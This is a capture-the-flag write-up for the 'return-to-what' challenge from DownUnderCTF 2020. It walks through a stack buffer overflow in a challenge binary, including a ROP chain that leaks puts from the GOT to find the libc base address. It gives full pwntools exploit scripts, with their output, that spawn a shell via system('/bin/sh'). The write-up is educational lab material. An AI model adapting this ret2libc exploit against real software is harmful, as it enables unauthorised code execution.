# return-to-what
this challenge was quite cool to complete, although i completed it locally on my machine (Arch Linux 5.16.4-arch1-1) instead of the real target (a Ubuntu machine) although i will show at the end how to do this challenge on ubuntu using `libc-database`.
## Checking the binary
First things first, we want to check which linker/libraries are attached to this binary, to do so i will use the `ldd` command on our binary :
```
$ ldd ./challenge/return-to-what
		linux-vdso.so.1 (0x00007fff53558000)
		libc.so.6 => /usr/lib/libc.so.6 (0x00007fe8db8f4000)
		/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fe8dbb04000)
```
In the preceding output, you can see that the binary uses `/usr/lib/libc.so.6`. Next let's check for the protections on this binary.
```
$ checksec --file challenge/return-to-what
[*] '/home/korenkovichski/Documents/CTF/DownunderCTF_2020/pwn/return-to-what/challenge/return-to-what'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Luckily for us the binary has no PIE which will make our life a LOT easier for determining libc offsets, since offsets will stay the same every time we run the binary.
## Finding a vulnerability
Now it's time to find where this program is vulnerable, in this case i didn't need a disassembler to find the vulnerable part, i just tried a cyclic pattern and the program directly crashed.
```
$ ./return-to-what <<<$(cyclic 200)
Today, we'll have a lesson in returns.
Where would you like to return to?
[1]    23700 segmentation fault (core dumped)  ./return-to-what <<< $(cyclic 200)
```
So i hopped in GDB and found the offset at which we overwrite the return address.
```
pwndbg> r <<<$(cyclic 200)
pwndbg> cyclic -l 0x6161616f
56
```
We know we need a padding of 56 bytes before we can start overwriting the return address and therefore gaining control of the program.
## Leak a function from .got table
Now we need a leak, since the challenge doesn't provide any libc files, our binary is using the default libc library at `/usr/lib/libc.so.6`, since it's the default library on my OS it is quite complete and contains the `puts` function which is the easiest one to use when trying to leak addresses, we will leak the `puts` function in the `.got table` and call `puts` through the `procedure linkage table`.
```py
from pwn import *

e = ELF("./challenge/return-to-what", checksec=False)
libc = ELF("/usr/lib/libc.so.6", checksec=False)

io = process(e.path)

context.binary = e
context.terminal = ["konsole", "-e"]

PADDING_BEFORE_RETADDR = 56

rop = ROP(e)
POP_RDI_RET = rop.find_gadget(["pop rdi", "ret"])[0]


PAYLOAD = [
	PADDING_BEFORE_RETADDR * b"A",
	p64(POP_RDI_RET),
	p64(e.got.puts),
	p64(e.plt.puts)
]

io.sendline(b"".join(PAYLOAD))

io.recvline()
io.recvline()
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
info(f"puts leak : {hex(leak)}")
io.interactive()
```
Running the script, proof that indeed we were able to leak the address of `puts` in the `global offset table`.
```bash
$ python3 leak.py
[+] Starting local process '/home/korenkovichski/Documents/CTF/DownunderCTF_2020/pwn/return-to-what/challenge/return-to-what': pid 24257
[*] Loaded 14 cached gadgets for './challenge/return-to-what'
[*] puts leak : 0x7f9664a92ab0
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```
## Calculate libc address using leak
Our goal in this challenge is to end up calling `system("/bin/sh")` which will spawn us a shell, but manually calling system through an exploit is impossible if you don't know the actual address of system in memory.

We're a bit lucky here, PIE was disabled and therefore address will stay the same most of the time.

So time to calculate that offset, to do that we just need a simple substraction `"(current address of puts - it's offset in libc)"`, this simple operation should result in the base address of libc. We can add the following code to our script.
```py
info(f"offset of puts in libc : {hex(libc.symbols["puts"])}")
libc.address = leak - libc.symbols["puts"]
info(f"base address of libc : {hex(libc.address)}")
```
Now if we run the script again we can see the base address of libc was leaked properly !
```sh
python3 leak.py
[+] Starting local process '/home/korenkovichski/Documents/CTF/DownunderCTF_2020/pwn/return-to-what/challenge/return-to-what': pid 24399
[*] Loaded 14 cached gadgets for './challenge/return-to-what'
[*] puts leak : 0x7f123607aab0
[*] offset of puts in libc : 0x76ab0
[*] base address of libc : 0x7f1236004000
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
```
The outputs makes a lot of sense, libc address tend to end with a bunch of zeros.
## Catch Shell
Funniest part, time to catch shells... hehe. Now to make the exploit simpler, we will call the main function once again and therefore we will hit the vulnerable part of our program a second time where we will input another buffer overflow payload, but this time since we know the base address of libc we can just call `system("/bin/sh")`.

Here is the final exploit that i used to exploit and win this challenge.
```py
from pwn import *

e = ELF("./challenge/return-to-what", checksec=False)
libc = ELF("/usr/lib/libc.so.6", checksec=False)

io = process(e.path)

context.binary = e
context.terminal = ["konsole", "-e"]

PADDING_BEFORE_RETADDR = 56

rop = ROP(e)
POP_RDI_RET = rop.find_gadget(["pop rdi", "ret"])[0]


PAYLOAD = [
	PADDING_BEFORE_RETADDR * b"A",
	p64(POP_RDI_RET),
	p64(e.got.puts),
	p64(e.plt.puts),
	p64(e.sym.main)  # note this change
]

io.sendline(b"".join(PAYLOAD))

io.recvline()
io.recvline()
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
info(f"puts leak : {hex(leak)}")

info(f"offset of puts in libc : {hex(libc.symbols["puts"])}")
libc.address = leak - libc.symbols["puts"]
info(f"base address of libc : {hex(libc.address)}")

SECOND_PAYLOAD = [
	b"A"*56,
	POP_RDI_RET,
	p64(next(libc.search(b"/bin/sh"))),
	p64(libc.sym["system"])
]

io.sendline(b"".join(SECOND_PAYLOAD))

io.interactive()
```
Running the preceding code locally with the right libc path should usually result in you obtaining a shell, however when the challenge is being ran on a remote ubuntu machine, we do not have access to the library.
## Finding the right library
Our binary is running on a remote system, ready to be pwned hehe. But we have a problem, we don't know what are the offsets in libc. What you can do is instead of leaking puts, you can leak other functions too in the .got table, then head up at https://libc.rip and search those offsets together, this shoud output you the correct libc version that you need to pwn.